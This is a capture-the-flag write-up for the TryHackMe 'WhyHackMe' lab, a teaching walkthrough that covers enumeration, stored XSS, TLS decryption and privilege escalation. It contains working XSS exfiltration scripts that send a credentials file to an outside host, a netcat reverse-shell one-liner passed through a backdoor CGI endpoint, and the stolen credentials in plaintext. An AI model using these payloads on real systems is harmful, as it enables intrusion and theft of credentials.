# TryHackMe-WhyHackMe

**Scope:**

- IPTables
- TLS Decrypting
- XSS

**Keywords:**

- FTP Enumeration & File Gathering
- Cross Site Scripting (XSS)
- Data Exfiltration
- SSH Connection
- File Transfer with SSH
- iptables
- PCAP Analysis
- Wireshark
- Decrypting Traffic with Key
- Remote Code Execution

**Main Commands:**

- `nmap -sS -sV -sC -T4 -A -O -oN nmap_result.txt -Pn -F $target_ip`
- `nmap --script="ftp-*" -T4 -oN nmap_ftp_result.txt -Pn -p 21 $target_ip`
- `ftp whyhackme.thm`
- `wget -m ftp://anonymous:anonymous@whyhackme.thm`
- `gobuster dir -u http://whyhackme.thm -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,txt --random-agent -b 404,500,501,502,503 -e -t 50`
- `curl -iLX $'POST' -d $'username=overthenet' -d $'password=overhenet' -H $'Content-Type: application/x-www-form-urlencoded' $'http://whyhackme.thm/register.php'`
- `echo 'PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9JRVRGLy9EVEQgSFRNTCAyLjAvL0VOIj4KPGh0bWw+PGhlYWQ+Cjx0aXRsZT40MDMgRm9yYmlkZGVuPC90aXRsZT4KPC9oZWFkPjxib2R5Pgo8aDE+Rm9yYmlkZGVuPC9oMT4KPHA+WW91IGRvbid0IGhhdmUgcGVybWlzc2lvbiB0byBhY2Nlc3MgdGhpcyByZXNvdXJjZS48L3A+Cjxocj4KPGFkZHJlc3M+QXBhY2hlLzIuNC40MSAoVWJ1bnR1KSBTZXJ2ZXIgYXQgd2h5aGFja21lLnRobSBQb3J0IDgwPC9hZGRyZXNzPgo8L2JvZHk+PC9odG1sPgo=' | base64 -d`
- `echo 'amFjazpXaHlJc015UGFzc3dvcmRTb1N0cm9uZ0lESwo=' | base64 -d`
- `ssh -o MACs=hmac-sha2-256 jack@whyhackme.thm -p 22`
- `scp -o MACs=hmac-sha2-256 jack@whyhackme.thm:/etc/apache2/certs/apache.key /root/Desktop/CyberLearningFramework/whyhackme/apache.key`
- `scp -o MACs=hmac-sha2-256 jack@whyhackme.thm:/opt/capture.pcap /root/Desktop/CyberLearningFramework/whyhackme/capture.pcap`
- `curl -k -s 'https://10.10.96.230:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN' --data-urlencode cmd='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.2.37.37 443 >/tmp/f'`

**System Commands:**

- `<script>alert(1)</script>`
- `<script src="http://10.2.37.37/xssex.js"></script>`
- `<script src=http://10.2.37.37/exfilscript.js></script>`
- `sudo -l`
- `sudo /usr/sbin/iptables -L`
- `sudo iptables -I INPUT -p tcp --dport 41312 -j ACCEPT`
- `tail -n 20 /etc/apache2/sites-available/000-default.conf`
- `find / -type f -name "*.key" 2>/dev/null`
- `python3 -c 'import pty;pty.spawn("/bin/bash");’`
- `export TERM=xterm`
- `sudo su -`

### Laboratory Environment

[WhyHackMe](https://tryhackme.com/r/room/whyhackme)

### Penetration Approaches and Commands

> **Network Enumeration Phase**
> 

`nmap -sS -sV -sC -T4 -A -O -oN nmap_result.txt -Pn -F $target_ip`

```bash
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.2.37.37
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 47:71:2b:90:7d:89:b8:e9:b4:6a:76:c1:50:49:43:cf (RSA)
|   256 cb:29:97:dc:fd:85:d9:ea:f8:84:98:0b:66:10:5e:6f (ECDSA)
|_  256 12:3f:38:92:a7:ba:7f:da:a7:18:4f:0d:ff:56:c1:1f (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Welcome!!
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

> **HTTP Port Check**
> 

`curl -iLX GET -D response.txt http://whyhackme.thm`

```bash
HTTP/1.1 200 OK
Date: Sun, 27 Oct 2024 09:33:54 GMT
Server: Apache/2.4.41 (Ubuntu)
Set-Cookie: PHPSESSID=7oc2t1qvs4p45edg0ul3ck5rec; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 563
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
<style type="text/css">
        .center{
                text-align: center;
                border: double;
        }
        div{
                background-color: skyblue;
        }
        a{
                color: indianred;
        }
</style>
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Welcome!!</title>
</head>
<body>
        <div class="center">
                <h2> Welcome to my personal website. <h2>
                <p> Please read my first blog at <a href="/blog.php">blog.php</a></p>
                <p> New blogs are coming soon, please be patient. </p>
                <p> Made with love. </p>
        </div>
</body>
</html>
```

> **FTP Enumeration & File Gathering Phase**
> 

`nmap --script="ftp-*" -T4 -oN nmap_ftp_result.txt -Pn -p 21 $target_ip`

```bash
PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.2.37.37
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-brute: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 1295 guesses in 302 seconds, average tps: 4.0
```

`ftp whyhackme.thm`

```bash
Name (whyhackme.thm:root): anonymous
331 Please specify the password.
Password: 

230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> dir
229 Entering Extended Passive Mode (|||6567|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
226 Directory send OK.
ftp> mget update.txt
mget update.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||22054|)
150 Opening BINARY mode data connection for update.txt (318 bytes).
100% |*****************************************************************************************************|   318       16.95 KiB/s    00:00 ETA
226 Transfer complete.
318 bytes received in 00:00 (0.91 KiB/s)
ftp> 
```

`wget -m ftp://anonymous:anonymous@whyhackme.thm`

```bash
[REDACTED] - SAME RESULT
```

`cat update.txt`

```bash
Hey I just removed the old user mike because that account was compromised and
for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt
and don't worry this file is only accessible by localhost(127.0.0.1),
so nobody else can view it except me or people with access to the common account. 
- admin
```

> **Directory Scan & Endpoint Control**
> 

`gobuster dir -u http://whyhackme.thm -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,txt --random-agent -b 404,500,501,502,503 -e -t 50`

```bash
http://whyhackme.thm/blog.php             (Status: 200) [Size: 3102]
http://whyhackme.thm/login.php            (Status: 200) [Size: 523]
http://whyhackme.thm/register.php         (Status: 200) [Size: 643]
http://whyhackme.thm/dir                  (Status: 403) [Size: 278]
http://whyhackme.thm/assets               (Status: 301) [Size: 315] [--> http://whyhackme.thm/assets/]
http://whyhackme.thm/logout.php           (Status: 302) [Size: 0] [--> login.php]
http://whyhackme.thm/config.php           (Status: 200) [Size: 0]
```

`curl -iLX GET http://whyhackme.thm/blog.php`

```bash
HTTP/1.1 200 OK
Date: Sun, 27 Oct 2024 09:43:01 GMT
Server: Apache/2.4.41 (Ubuntu)
Set-Cookie: PHPSESSID=m7njr475sa69chpfad3os0oftf; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 3102
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang="en">
<link rel="stylesheet" href="/assets/style.css">
<head>
        <title> Welcome! </title>
</head>
<header class="header">
        <h1> Hello, welcome to my blog. </h1>
</header><br>
<body>
        <section class="posts">
  <article class="posts__item">
    <h1>My first blog!</h1>
                <h2>Lorem ipsum dolor sit amet, consectetur adipisci elit, sed eiusmod tempor incidunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrum exercitationem ullam corporis suscipit laboriosam, nisi ut aliquid ex ea commodi consequatur. Quis aute iure reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint obcaecat cupiditat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</h2>
                <h2><p>Lorem ipsum dolor sit amet. Id ipsa dolore et velit velit ut nobis rerum a aliquam nesciunt. Ea quas corrupti est cumque doloremque et tempore eveniet. Et internos dicta sit Quis galisum et odit laborum ea sapiente repellendus sit commodi voluptates sit commodi autem. </p><p>Et quia necessitatibus est porro fugit ea pariatur laudantium id nostrum quod aut minima inventore ut quia commodi aut sunt ipsam. Aliquid rerum et error minus aut temporibus cupiditate eum molestiae nihil aut quasi cupiditate est veritatis voluptas est natus officia? Qui officia maxime et deserunt rerum est Quis voluptatibus eos voluptatem autem est tempora autem id quia voluptatum. Et sunt ipsa eos consequatur dolorem ut neque enim est accusantium reprehenderit cum aperiam laudantium est praesentium officia qui velit minima. </p><p>Non voluptatibus laboriosam At delectus tempore vel aperiam officiis qui dolor voluptate et enim cupiditate et impedit alias. Vel reprehenderit asperiores vel alias harum ea quia blanditiis est iusto provident? </p>
                </h2>
                <h2><p>Lorem ipsum dolor sit amet. Aut recusandae minus qui sint inventore est quos dolor et nemo provident 33 voluptas mollitia qui consequatur commodi sit quis iusto! Cum omnis cupiditate vel corrupti repellendus nam omnis provident qui consequatur corrupti. </p><p>Qui laborum itaque ex eius rerum ut illo voluptatum ad corrupti necessitatibus ea exercitationem consectetur nam mollitia tenetur. Qui atque quia qui nobis fugiat et delectus nostrum ea quia harum 33 tempore quae hic ipsa quasi. </p><p>Sed odio assumenda et eveniet aliquid ut optio delectus est enim illo ut doloribus quod sit quae repellendus et laborum quia! Ut minima itaque non dignissimos fugiat At esse sint sit molestias fugit et similique maxime et ratione repudiandae. Et omnis veritatis et accusamus quae ea fugit quas ea dignissimos culpa non necessitatibus nemo. Aut tempore deleniti et quia praesentium qui asperiores consequatur qui doloribus distinctio hic nihil animi aut amet quisquam? </p></h2>
                <h2><b>Comment Section:-</b></h2><br>
                <h2>To comment you need to be logged in. To login please visit <a href='/login.php'>this</a> link.</h2><br><h2>All comments:</h2><br><h2>Name: admin<br>Comment: Hey people, I will be monitoring your comments so please be safe and civil.</h2>
        </article>
</body>
</html>
```

`curl -iLX GET http://whyhackme.thm/config.php`

```bash
HTTP/1.1 200 OK
Date: Sun, 27 Oct 2024 09:43:53 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

`curl -iLX GET http://whyhackme.thm/register.php`

```bash
HTTP/1.1 200 OK
Date: Sun, 27 Oct 2024 09:44:10 GMT
Server: Apache/2.4.41 (Ubuntu)
Set-Cookie: PHPSESSID=ljs1emjqvqj27dts50o6ttd9ct; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 643
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
<link rel="stylesheet" href="/assets/login.css">
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Registration Form</title>
</head>
<body>
        <div class="center">
        <h2>If you are new to this website you may register here.</h2>
        <form action="/register.php" method="post">
                <label for="username">Please enter your desired username:</label><br>
                <input type="text" name="username"><br>
                <label for="password">Enter your password:</label><br>
                <input type="password" name="password"><br>
                <input type="submit" name="Register">
        </form>
</div>
</body>
</html>

```

![image.png](image.png)

`curl -iLX $'POST' -d $'username=overthenet' -d $'password=overhenet' -H $'Content-Type: application/x-www-form-urlencoded' $'http://whyhackme.thm/register.php'`

```bash
HTTP/1.1 200 OK
Date: Sun, 27 Oct 2024 09:46:30 GMT
Server: Apache/2.4.41 (Ubuntu)
Set-Cookie: PHPSESSID=ep7citfc8qvt9s8th39h81gbg4; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 730
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
<link rel="stylesheet" href="/assets/login.css">
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Registration Form</title>
</head>
<body>
        <div class="center">
        <h2>If you are new to this website you may register here.</h2>
        <form action="/register.php" method="post">
                <label for="username">Please enter your desired username:</label><br>
                <input type="text" name="username"><br>
                <label for="password">Enter your password:</label><br>
                <input type="password" name="password"><br>
                <input type="submit" name="Register">
        </form>
<p>Your account has been registered now you may login <a href='/login.php'>here</a></p></div>
</body>
</html>
```

`curl -iLX GET http://whyhackme.thm/login.php`

```bash
HTTP/1.1 200 OK
Date: Sun, 27 Oct 2024 09:50:22 GMT
Server: Apache/2.4.41 (Ubuntu)
Set-Cookie: PHPSESSID=scocgq1c7kv8iaag3kvbn1nbr0; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 523
Content-Type: text/html; charset=UTF-8

<html>
<link rel="stylesheet" href="/assets/login.css">
<title>Login Form</title>
<body>
        <div class="center">
                <h2> Enter ur username and password </h2>
                <form action="/login.php" method="post">
                    <label for="username"><h2><b>Username:</b></h2></label><br>
                    <input type="text" name="username"><br>
                    <br>
                    <label for="password"><h2><b>Password:</b></h2></label><br>
                    <input type="password" name="password"><br>
                    <br>
                        <input type="submit" value="Submit">
                </form>

</div>
</body>
</html>

```

`curl -iLX $'POST' --data-binary $'username=overthenet&password=overhenet' -H $'Content-Type: application/x-www-form-urlencoded' $'http://whyhackme.thm/login.php'`

```bash
HTTP/1.1 200 OK
Date: Sun, 27 Oct 2024 09:55:26 GMT
Server: Apache/2.4.41 (Ubuntu)
Set-Cookie: PHPSESSID=7o0ss83k7aiucpltchabt21aos; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 707
Content-Type: text/html; charset=UTF-8

<html>
<link rel="stylesheet" href="/assets/login.css">
<title>Login Form</title>
<body>
        <div class="center">
                <h2> Enter ur username and password </h2>
                <form action="/login.php" method="post">
                    <label for="username"><h2><b>Username:</b></h2></label><br>
                    <input type="text" name="username"><br>
                    <br>
                    <label for="password"><h2><b>Password:</b></h2></label><br>
                    <input type="password" name="password"><br>
                    <br>
                        <input type="submit" value="Submit">
                </form>

Logged in successfully.<p>You can now comment on blogs, to do so visit <a href='/blog.php'>blog.php</a></p><h2> To logout visit /logout.php or click <a href='/logout.php'>here</a></h2></div>
</body>
</html>

```

![image.png](image%201.png)

> **Cross Site Scripting (XSS) & Data Exfiltration Phase**
> 

**For more information:**

[Simple Data Exfiltration Through XSS](https://trustedsec.com/blog/simple-data-exfiltration-through-xss)

![image.png](image%202.png)

![image.png](image%203.png)

**PAYLOAD:**

```bash
<script>alert(1)</script>
```

![image.png](image%204.png)

![image.png](image%205.png)

![image.png](image%206.png)

![image.png](image%207.png)

![image.png](image%208.png)

![image.png](image%209.png)

`nano exfilscript.js`

```bash
function read_body(xhr) 
{ 
	var data;

	if (!xhr.responseType || xhr.responseType === "text") 
	{
		data = xhr.responseText;
	} 
	else if (xhr.responseType === "document") 
	{
		data = xhr.responseXML;
	} 
	else if (xhr.responseType === "json") 
	{
		data = xhr.responseJSON;
	} 
	else 
	{
		data = xhr.response;
	}
	return data; 
}

function stealData()
{
	var uri = "/dir/pass.txt";

	xhr = new XMLHttpRequest();
	xhr.open("GET", uri, true);
	xhr.send(null);

	xhr.onreadystatechange = function()
	{
		if (xhr.readyState == XMLHttpRequest.DONE)
		{
			// We have the response back with the data
			var dataResponse = read_body(xhr);

			// Time to exfiltrate the HTML response with the data
			var exfilChunkSize = 2000;
			var exfilData      = btoa(dataResponse);
			var numFullChunks  = ((exfilData.length / exfilChunkSize) | 0);
			var remainderBits  = exfilData.length % exfilChunkSize;

			// Exfil the yummies
			for (i = 0; i < numFullChunks; i++)
			{
				console.log("Loop is: " + i);

				var exfilChunk = exfilData.slice(exfilChunkSize *i, exfilChunkSize * (i+1));

				// Let's use an external image load to get our data out
				// The file name we request will be the data we're exfiltrating
				var downloadImage = new Image();
				downloadImage.onload = function()
				{
					image.src = this.src;
				};

				// Try to async load the image, whose name is the string of data
				downloadImage.src = "http://10.2.37.37/exfilscript/" + i + "/" + exfilChunk + ".jpg";
			}

			// Now grab that last bit
			var exfilChunk = exfilData.slice(exfilChunkSize * numFullChunks, (exfilChunkSize * numFullChunks) + remainderBits);
			var downloadImage = new Image();
			downloadImage.onload = function()
			{
    			image.src = this.src;   
			};

			downloadImage.src = "http://10.2.37.37/exfilscript/" + "LAST" + "/" + exfilChunk + ".jpg";
			console.log("Done exfiling chunks..");
		}
	}
}

stealData();

```

`python3 -m http.server 80`

```bash
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

![image.png](image%2010.png)

**PAYLOAD:**

```bash
<script src=http://10.2.37.37/exfilscript.js></script>
```

![image.png](image%2011.png)

![image.png](image%2012.png)

```bash
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.2.37.37 - - [27/Oct/2024 06:20:31] "GET /exfilscript.js HTTP/1.1" 200 -
10.2.37.37 - - [27/Oct/2024 06:20:33] code 404, message File not found
10.2.37.37 - - [27/Oct/2024 06:20:33] "GET /exfilscript/LAST/PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9JRVRGLy9EVEQgSFRNTCAyLjAvL0VOIj4KPGh0bWw+PGhlYWQ+Cjx0aXRsZT40MDMgRm9yYmlkZGVuPC90aXRsZT4KPC9oZWFkPjxib2R5Pgo8aDE+Rm9yYmlkZGVuPC9oMT4KPHA+WW91IGRvbid0IGhhdmUgcGVybWlzc2lvbiB0byBhY2Nlc3MgdGhpcyByZXNvdXJjZS48L3A+Cjxocj4KPGFkZHJlc3M+QXBhY2hlLzIuNC40MSAoVWJ1bnR1KSBTZXJ2ZXIgYXQgd2h5aGFja21lLnRobSBQb3J0IDgwPC9hZGRyZXNzPgo8L2JvZHk+PC9odG1sPgo=.jpg HTTP/1.1" 404 -
```

`echo 'PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9JRVRGLy9EVEQgSFRNTCAyLjAvL0VOIj4KPGh0bWw+PGhlYWQ+Cjx0aXRsZT40MDMgRm9yYmlkZGVuPC90aXRsZT4KPC9oZWFkPjxib2R5Pgo8aDE+Rm9yYmlkZGVuPC9oMT4KPHA+WW91IGRvbid0IGhhdmUgcGVybWlzc2lvbiB0byBhY2Nlc3MgdGhpcyByZXNvdXJjZS48L3A+Cjxocj4KPGFkZHJlc3M+QXBhY2hlLzIuNC40MSAoVWJ1bnR1KSBTZXJ2ZXIgYXQgd2h5aGFja21lLnRobSBQb3J0IDgwPC9hZGRyZXNzPgo8L2JvZHk+PC9odG1sPgo=' | base64 -d`

```bash
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at whyhackme.thm Port 80</address>
</body></html>

```

`nano xssex.js`

```bash
var target_url = "http://127.0.0.1/dir/pass.txt";
var my_server = "http://10.2.37.37/data";
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch(my_server + "?" + encodeURI(btoa(xhr.responseText)))
    }
}
xhr.open('GET', target_url, true);
xhr.send(null);
```

![image.png](image%2013.png)

**PAYLOAD:**

```bash
<script src="http://10.2.37.37/xssex.js"></script>
```

![image.png](image%2014.png)

![image.png](image%2015.png)

```bash
10.10.96.230 - - [27/Oct/2024 06:38:25] "GET /data?amFjazpXaHlJc015UGFzc3dvcmRTb1N0cm9uZ0lESwo= HTTP/1.1" 301 -
10.10.96.230 - - [27/Oct/2024 06:39:24] "GET /exfilscript.js HTTP/1.1" 200 -
10.10.96.230 - - [27/Oct/2024 06:39:24] "GET /xssex.js HTTP/1.1" 200 -
10.10.96.230 - - [27/Oct/2024 06:39:25] "GET /data?amFjazpXaHlJc015UGFzc3dvcmRTb1N0cm9uZ0lESwo= HTTP/1.1" 301 -
```

`echo 'amFjazpXaHlJc015UGFzc3dvcmRTb1N0cm9uZ0lESwo=' | base64 -d`

```bash
jack:WhyIsMyPasswordSoStrongIDK
```

> **SSH Connection Phase**
> 

`ssh -o MACs=hmac-sha2-256 jack@whyhackme.thm -p 22`

```bash
jack@whyhackme.thm's password: WhyIsMyPasswordSoStrongIDK

jack@ubuntu:~$ whoami
jack
jack@ubuntu:~$ id
uid=1001(jack) gid=1001(jack) groups=1001(jack)
jack@ubuntu:~$ pwd
/home/jack
jack@ubuntu:~$ uname -a
Linux ubuntu 5.4.0-159-generic #176-Ubuntu SMP Mon Aug 14 12:04:20 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
jack@ubuntu:~$ dpkg --version
Debian 'dpkg' package management program version 1.19.7 (amd64).
This is free software; see the GNU General Public License version 2 or
later for copying conditions. There is NO warranty.
jack@ubuntu:~$ which python
jack@ubuntu:~$ which netcat
/usr/bin/netcat
jack@ubuntu:~$ 

```

> **Internal System & File Enumeration Phase**
> 

```bash
jack@ubuntu:~$ sudo -l

[sudo] password for jack: 
Matching Defaults entries for jack on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jack may run the following commands on ubuntu:
    (ALL : ALL) /usr/sbin/iptables
    
jack@ubuntu:~$ sudo /usr/sbin/iptables -L

Chain INPUT (policy ACCEPT)
target     prot opt source               destination         
DROP       tcp  --  anywhere             anywhere             tcp dpt:41312
ACCEPT     all  --  anywhere             anywhere            
ACCEPT     all  --  anywhere             anywhere             ctstate NEW,RELATED,ESTABLISHED
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http
ACCEPT     icmp --  anywhere             anywhere             icmp echo-request
ACCEPT     icmp --  anywhere             anywhere             icmp echo-reply
DROP       all  --  anywhere             anywhere            

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination         
ACCEPT     all  --  anywhere             anywhere

jack@ubuntu:~$ sudo iptables -I INPUT -p tcp --dport 41312 -j ACCEPT
jack@ubuntu:~$
```

`nmap -sS -sC -sV -T4 -A -p 41312 -oN nmap_41312_result.txt -Pn $target_ip`

```bash
PORT      STATE SERVICE VERSION
41312/tcp open  http    Apache httpd 2.4.41
|_http-title: 400 Bad Request
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), HP P2000 G3 NAS device (93%), ASUS RT-N56U WAP (Linux 3.4) (92%), Linux 3.16 (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (92%), Linux 3.1 - 3.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: www.example.com
```

```bash
jack@ubuntu:~$ cd ..
jack@ubuntu:/home$ cd ..
jack@ubuntu:/$ ls -lsa /opt
total 40
 4 drwxr-xr-x  2 root root  4096 Aug 16  2023 .
 4 drwxr-xr-x 19 root root  4096 Mar 14  2023 ..
28 -rw-r--r--  1 root root 27247 Aug 16  2023 capture.pcap
 4 -rw-r--r--  1 root root   388 Aug 16  2023 urgent.txt

jack@ubuntu:/$ cat /opt/urgent.txt
Hey guys, after the hack some files have been placed in /usr/lib/cgi-bin/ and
when I try to remove them, they wont, even though I am root.
Please go through the pcap file in /opt and help me fix the server.
And I temporarily blocked the attackers access to the backdoor by using iptables rules.
The cleanup of the server is still incomplete I need to start by deleting these files first.

jack@ubuntu:/$ ls -lsa /usr/lib/

[REDACTED] - MORE

  4 drwxr-x---  2 root h4ck3d   4096 Aug 16  2023 cgi-bin

[REDACTED] - MORE

jack@ubuntu:/$ tail -n 20 /etc/apache2/sites-available/000-default.conf

        ServerName www.example.com
        ServerAdmin webmaster@localhost
        #ErrorLog ${APACHE_LOG_DIR}/error.log
        #CustomLog ${APACHE_LOG_DIR}/access.log combined
        ErrorLog /dev/null
        SSLEngine on
        SSLCipherSuite AES256-SHA
        SSLProtocol -all +TLSv1.2
        SSLCertificateFile /etc/apache2/certs/apache-certificate.crt
        SSLCertificateKeyFile /etc/apache2/certs/apache.key
        ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
        AddHandler cgi-script .cgi .py .pl
        DocumentRoot /usr/lib/cgi-bin/
        <Directory "/usr/lib/cgi-bin">
                AllowOverride All 
                Options +ExecCGI -Multiviews +SymLinksIfOwnerMatch
                Order allow,deny
                Allow from all
        </Directory>
</VirtualHost>

jack@ubuntu:/$ find / -type f -name "*.key" 2>/dev/null
/etc/apache2/certs/apache.key

jack@ubuntu:/$ 
```

> **File Transfer Phase**
> 

`scp -o MACs=hmac-sha2-256 jack@whyhackme.thm:/etc/apache2/certs/apache.key /root/Desktop/CyberLearningFramework/whyhackme/apache.key`

```bash
jack@whyhackme.thm's password: WhyIsMyPasswordSoStrongIDK
apache.key
```

`scp -o MACs=hmac-sha2-256 jack@whyhackme.thm:/opt/capture.pcap /root/Desktop/CyberLearningFramework/whyhackme/capture.pcap`

```bash
jack@whyhackme.thm's password: WhyIsMyPasswordSoStrongIDK
capture.pcap 
```

> **PCAP Analysis & Decrypting Traffic with Key Phase**
> 

![image.png](image%2016.png)

![image.png](image%2017.png)

![image.png](image%2018.png)

![image.png](image%2019.png)

**ENDPOINT:**

```bash
/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id
```

> **Remote Code Execution & Reverse Shell Phase**
> 

`curl -skLX GET 'https://whyhackme.thm:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id'` 

```bash
<h2>uid=33(www-data) gid=1003(h4ck3d) groups=1003(h4ck3d)
<h2>
```

`curl -skLX GET 'https://whyhackme.thm:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=ls'`

```bash
<h2>5UP3r53Cr37.py
<h2>
```

`nc -nlvp 443`

```bash
listening on [any] 443 ...
```

`curl -k -s 'https://10.10.96.230:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN' --data-urlencode cmd='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.2.37.37 443 >/tmp/f'`

```bash
connect to [10.2.37.37] from (UNKNOWN) [10.10.96.230] 47648
bash: cannot set terminal process group (825): Inappropriate ioctl for device
bash: no job control in this shell

www-data@ubuntu:/usr/lib/cgi-bin$ whoami
www-data

www-data@ubuntu:/usr/lib/cgi-bin$ id
uid=33(www-data) gid=1003(h4ck3d) groups=1003(h4ck3d)

www-data@ubuntu:/usr/lib/cgi-bin$ pwd
/usr/lib/cgi-bin

www-data@ubuntu:/usr/lib/cgi-bin$ python3 -c 'import pty;pty.spawn("/bin/bash");'
www-data@ubuntu:/usr/lib/cgi-bin$ export TERM=xterm

www-data@ubuntu:/usr/lib/cgi-bin$ 
```

> **Privilege Escalation Phase**
> 

```bash
www-data@ubuntu:/usr/lib/cgi-bin$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: ALL
    
www-data@ubuntu:/usr/lib/cgi-bin$ sudo su -
root@ubuntu:~# whoami
whoami
root
root@ubuntu:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:~# 

```

# Appendix

## IPTables

<aside>
💡

IPTables is a command-line utility in Linux used to configure the netfilter firewall, which controls and manages the flow of network traffic to and from the system. IPTables acts as a powerful tool for network packet filtering and NAT (Network Address Translation) to define rules on how incoming and outgoing traffic is handled, which is essential for both security and traffic management.

</aside>